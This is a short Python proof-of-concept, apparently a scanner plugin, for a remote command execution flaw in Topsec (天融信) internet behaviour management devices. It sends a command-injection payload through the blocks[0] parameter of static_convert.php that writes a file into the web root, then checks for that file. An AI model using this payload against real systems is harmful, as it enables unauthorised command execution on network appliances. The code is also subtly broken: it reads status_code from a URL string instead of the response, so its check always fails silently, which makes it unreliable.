import requests
import urllib, re, random, string

def verify(url):
    relsult = {
        'name': '天融信 上网行为管理RCE(2022HVV)',
        'vulnerable': False,
        'attack': False,
        'url': url,
        'about': 'https://mp.weixin.qq.com/s/s_bv4k92Zz-kZFieKN2Qlg',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = randstr1 + randstr2
    payload = '/view/IPV6/naborTable/static_convert.php?blocks[0]=||  echo \''+ shell + '\' > /var/www/html/1.txt%0A'
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl =url + payload
    verify_url = urllib.parse.urljoin(url, '/1.txt')
    try:
        rep = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
        if rep.status_code == 200:
            verify_rep = requests.get(verify_url, headers=headers, timeout=timeout, verify=False)
            if verify_url.status_code == 200 and re.search(randstr1+randstr2, verify_rep.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult